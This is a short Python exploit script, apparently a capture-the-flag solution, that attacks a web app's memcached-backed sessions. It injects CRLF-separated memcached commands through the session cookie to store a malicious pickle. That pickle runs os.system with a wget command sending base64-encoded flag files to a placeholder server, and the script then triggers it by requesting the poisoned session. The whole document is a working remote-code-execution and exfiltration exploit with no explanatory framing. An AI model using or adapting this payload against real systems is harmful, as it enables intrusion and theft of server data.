import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('wget https://{YOUR_SERVER}?flag=$(cat /flag*.txt | base64)')
        return os.system, (cmd,)

def generate_exploit(session_id):
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = session_id.encode('utf-8') + b'\r\nset session:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get session:1337')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""

import requests

url = "http://{IP}:{PORT}"

response = requests.get(url)
session_id = response.headers['Set-Cookie'].split("session=")[1].split(';')[0]
requests.get(url, cookies={"session": generate_exploit(session_id)})
response = requests.get(url, cookies={"session": "1337"})
print(response.content)
